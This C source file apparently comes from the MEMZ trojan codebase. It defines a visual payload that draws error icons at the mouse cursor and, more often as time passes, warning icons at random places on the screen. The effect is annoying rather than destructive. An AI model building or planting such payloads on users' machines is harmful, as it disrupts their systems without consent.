#include "../MEMZ.h"

PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
	PAYLOADHEAD

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_WARNING));
	}

	out: return 2;
}